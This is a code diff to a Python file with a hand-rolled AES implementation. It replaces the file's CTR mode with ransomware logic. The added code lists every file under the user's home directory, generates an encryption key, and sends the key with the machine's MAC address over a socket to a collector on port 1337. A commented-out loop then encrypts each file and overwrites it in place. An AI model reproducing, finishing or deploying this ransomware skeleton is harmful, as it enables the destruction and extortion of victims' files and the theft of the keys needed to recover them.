@@ -1,4 +1,10 @@
-import random
+#!/usr/bin/python
+
+import os
+from pathlib import Path
+import secrets
+import uuid
+import socket
 
 def rot_l(x, shift):
     return (x << shift) % 256 | (x >> 8 - shift) % 256
@@ -209,22 +215,39 @@ class AES_CBC(AES):
         
         return plaintext
 
-class AES_CTR(AES):
-    def encrypt(self, plaintext: bytes, nonce: int, encoding = 'utf-8'):
-        ciphertext = b''
-        for i in range(0, len(plaintext), 16):
-            key = self.encrypt_block(nonce.to_bytes(16, 'big', signed = False))
-            ciphertext += xor(plaintext[i:i+16], key)
-            nonce += 1
+def get_files_recursive(path: Path):
+    files = []
 
-        return ciphertext
+    for file in path.iterdir():
+        if file == "encrypt.py":
+            continue
+        if file.exists():
+            if file.is_dir():
+                files.extend(get_files_recursive(file))
+            else:
+                files.append(str(file))
+    
+    return files
 
-    def decrypt(self, ciphertext: bytes, nonce: int):
-        plaintext = b''
-        for i in range(0, len(ciphertext), 16):
-            key = self.encrypt_block(nonce.to_bytes(16, 'big', signed = False))
-            plaintext += xor(ciphertext[i:i+16], key)
-            nonce += 1
+home_dir = Path.home()
+files = get_files_recursive(home_dir)
+print(files)
 
-        return plaintext
+key = secrets.SystemRandom().randbytes(16)
+mac = uuid.getnode().to_bytes(6, 'big')
 
+conn = socket.create_connection(('localhost', 1337))
+
+conn.send(mac + key)
+conn.close()
+
+aes = AES_CBC(key)
+
+# for file in files:
+#     with open(file, "rb") as thefile:
+#         contents = thefile.read()
+#     iv = secrets.SystemRandom().randbytes(16)
+#     contents_encrypted = aes.encrypt(contents, iv)
+#     print(iv + contents_encrypted)
+    # with open(file, "wb") as thefile:
+    #     thefile.write(iv + contents_encrypted)
